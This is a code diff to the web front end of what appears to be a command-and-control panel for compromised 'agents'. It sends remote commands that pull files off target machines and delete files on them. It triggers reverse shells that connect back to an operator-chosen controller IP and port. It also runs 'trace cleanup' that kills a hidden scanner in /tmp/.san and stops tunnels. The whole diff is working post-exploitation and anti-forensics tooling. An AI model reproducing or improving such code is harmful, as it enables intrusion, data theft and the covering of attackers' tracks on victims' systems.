@@ -1053,7 +1053,8 @@ async function downloadFile(name) {
   if (!S.selectedAgent) return;
   const path = document.getElementById("files-path").value.trim() || "/";
   const full = path === "/" ? `/${name}` : `${path}/${name}`;
-  await sendRaw(`upload ${full}`);
+  const sent = await sendRaw(`upload ${full}`);
+  if (!sent.ok) { toast("下载请求失败: " + sent.error, "error"); return; }
   toast(`Download request sent → file will appear in Library`, "info");
 }
 
@@ -1070,7 +1071,8 @@ async function deleteFile(name) {
   if (!confirm(`确认删除 ${agentTag()} 上的文件？\n\n  ${name}\n\n此操作不可撤销。`)) return;
   const path = document.getElementById("files-path").value.trim() || "/";
   const full = path === "/" ? `/${name}` : `${path}/${name}`;
-  await sendRaw(`rm -f "${full}"`);
+  const sent = await sendRaw(`rm -f "${full}"`);
+  if (!sent.ok) { toast("删除命令发送失败: " + sent.error, "error"); return; }
   toast(`已发送删除命令 ${agentTag()} ${name}`, "info");
 }
 
@@ -2677,12 +2679,19 @@ async function cleanupIssues() {
 // ── Internal send helper ───────────────────────────────────────────────────
 
 async function sendRaw(cmd) {
-  if (!S.selectedAgent) return;
-  return fetch("/api/command", {
-    method:  "POST",
-    headers: { "Content-Type": "application/json" },
-    body:    JSON.stringify({ agent_id: S.selectedAgent.id, command: cmd }),
-  });
+  if (!S.selectedAgent) return { ok: false, error: "no agent" };
+  try {
+    const r = await fetch("/api/command", {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({ agent_id: S.selectedAgent.id, command: cmd }),
+    });
+    const d = await r.json().catch(() => ({}));
+    if (!r.ok || d.error) return { ok: false, error: d.error || `HTTP ${r.status}` };
+    return { ok: true, command_id: d.command_id };
+  } catch (e) {
+    return { ok: false, error: e.message || "network" };
+  }
 }
 
 // ── Utilities ──────────────────────────────────────────────────────────────
@@ -3387,6 +3396,7 @@ const WSSHELL = {
     statusTimer: null,
     connected: false,
     boundAgent: null,   // 反弹会话所属 agent —— 切换 agent 时据此断开，屏幕上的终端永远属于当前选中项
+    expectOpen: false,  // 只有点了「触发连接」才接 xterm；禁止凭旧 bound 自动连
     _disconnectCount: 0,
     _resizeObs: null,
     _listenersAttached: false,
@@ -3413,9 +3423,10 @@ function _wsshellUpdateToolbar(backendActive, connected, waiting) {
     const stopBtn    = document.getElementById("wsshell-stop-btn");
     const connectBtn = document.getElementById("wsshell-connect-btn");
     const closeBtn   = document.getElementById("wsshell-close-btn");
-    if (startBtn)    startBtn.style.display   = backendActive ? "none" : "inline-flex";
+    if (startBtn)    startBtn.style.display   = (!connected && !waiting) ? "inline-flex" : "none";
     if (stopBtn)     stopBtn.style.display    = backendActive ? "inline-flex" : "none";
-    if (connectBtn)  connectBtn.style.display = (backendActive && !connected && !waiting) ? "inline-flex" : "none";
+    // cliws 是一次性配对：未在会话中就允许点「启动目标端反弹」，它会先重建桥接
+    if (connectBtn)  connectBtn.style.display = (!connected && !waiting) ? "inline-flex" : "none";
     if (closeBtn)    closeBtn.style.display   = connected ? "inline-flex" : "none";
 }
 
@@ -3520,21 +3531,33 @@ async function wsshellRefreshStatus() {
 
 async function wsshellConnect() {
     if (!S.selectedAgent) { toast("先选择 Agent", "error"); return; }
+    if (!(await _wsshellHydrateConfig())) {
+        toast("请填写控制端 IP", "error"); return;
+    }
+    const ip   = (document.getElementById("wsshell-ip")?.value   || "").trim();
+    const port = (document.getElementById("wsshell-port")?.value || "7337").trim();
+    if (!ip) { toast("请填写控制端 IP", "error"); return; }
 
     try {
         const r = await fetch("/api/wsshell/connect", {
             method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ agent_id: S.selectedAgent.id }),
+            body: JSON.stringify({
+                agent_id: S.selectedAgent.id,
+                controller_ip: ip,
+                controller_port: port,
+            }),
         });
         const d = await r.json();
         if (d.error) { toast("连接失败: " + d.error, "error"); return; }
 
         WSSHELL.boundAgent = S.selectedAgent.id;
+        WSSHELL.expectOpen = true;
         const waitText = document.getElementById("wsshell-waiting-text");
         if (waitText) waitText.textContent = `等待 ${agentTag()} 反弹连接…`;
-        toast(`wspty 命令已发送给 ${agentTag()}，等待反弹连接…`, "success");
+        toast(`已重建桥接并下发反弹给 ${agentTag()}，等待连接…`, "success");
         _wsshellSetStatus("● 等待连接", "#f39c12");
         _wsshellUpdateToolbar(true, false, true);
+        if (d.tmux_session) _wsshellUpdateTmuxBar(d.tmux_session, d.attach_cmd);
         document.getElementById("wsshell-waiting").style.display = "flex";
         document.getElementById("wsshell-term-wrap").style.display = "none";
         _wsshellStartPoll();
@@ -3555,7 +3578,7 @@ async function _wsshellPollStatus() {
         if (d.active) {
             WSSHELL._disconnectCount = 0;
             if (d.bound_agent_id) WSSHELL.boundAgent = d.bound_agent_id;
-            if (!WSSHELL.connected && S.selectedAgent && _wsshellBoundMatches(d)) {
+            if (WSSHELL.expectOpen && !WSSHELL.connected && S.selectedAgent && _wsshellBoundMatches(d)) {
                 _wsshellOpenTerminal();
             }
         } else if (WSSHELL.connected) {
@@ -3785,6 +3808,7 @@ function _wsshellSendResizeExact(rows, cols) {
 function _wsshellOnAgentDisconnect() {
     // Agent WS closed but cliws backend may still be running
     WSSHELL.connected = false;
+    WSSHELL.expectOpen = false;
     WSSHELL._disconnectCount = 0;
     clearInterval(WSSHELL.statusTimer);
     WSSHELL.statusTimer = null;
@@ -3898,18 +3922,35 @@ function wsshellBackToLive() {
     if (WSSHELL.term && WSSHELL.connected) WSSHELL.term.focus();
 }
 
+async function _wsshellHydrateConfig() {
+    const ipEl = document.getElementById("wsshell-ip");
+    const portEl = document.getElementById("wsshell-port");
+    if (ipEl && ipEl.value.trim()) return true;
+    try {
+        const [st, se] = await Promise.all([
+            fetch("/api/wsshell/status").then(r => r.json()).catch(() => ({})),
+            fetch("/api/settings").then(r => r.json()).catch(() => ({})),
+        ]);
+        const ip = String(st.ctrl_ip || se.wspty_host || "").trim();
+        const port = String(st.port || se.wspty_port || "").trim();
+        if (ipEl && ip) ipEl.value = ip;
+        if (portEl && port) portEl.value = port;
+    } catch (_) {}
+    return !!(ipEl && ipEl.value.trim());
+}
+
 // Called when WS Shell tab becomes active
 function _wsshellOnTabActive() {
     _wsshellUpdateAgentIndicator();
     wsshellLoadHistorySessions();
     _loadXterm().catch(e => console.warn("xterm preload failed:", e));
     wsshellRefreshStatus();
-    // F5 后不要重发 wspty；cliws 还在就恢复 poll，接回已有 PTY
-    fetch("/api/wsshell/status").then(r => r.json()).then(d => {
-      if (d.active && _wsshellBoundMatches(d) && !WSSHELL.connected) {
+    _wsshellHydrateConfig();
+    // 只有用户刚点了「触发连接」才接 xterm。cliws `-b` 是一次性配对，
+    // 凭旧 bound 自动打开会连上但无数据。
+    if (WSSHELL.expectOpen && !WSSHELL.connected) {
         _wsshellStartPoll();
-      }
-    }).catch(() => {});
+    }
 }
 
 // ── 目标机痕迹清理（走加密命令通道，无需活跃 WS Shell）────────────────────
@@ -3929,7 +3970,10 @@ function agentSweep(type) {
     if (!cmd) return;
     const labels = { scan: "扫描器 fscan (/tmp/.san，杀进程+删文件)", tunnel: "内置隧道节点（优雅停止，无文件可清）" };
     if (!confirm(`确认清理 ${agentTag()} 上的 ${labels[type]}？\n\n通过加密命令通道下发，约 15–30 秒生效，结果回显在终端。`)) return;
-    sendRaw(cmd).then(() => toast(`已发送清理命令 ${agentTag()} · ${labels[type]}`, "success"));
+    sendRaw(cmd).then(d => {
+        if (!d || !d.ok) toast("清理命令发送失败: " + (d && d.error || ""), "error");
+        else toast(`已发送清理命令 ${agentTag()} · ${labels[type]}`, "success");
+    }).catch(e => toast("清理命令发送失败: " + (e.message || ""), "error"));
 }
 
 function _upgStatus(msg, color) {
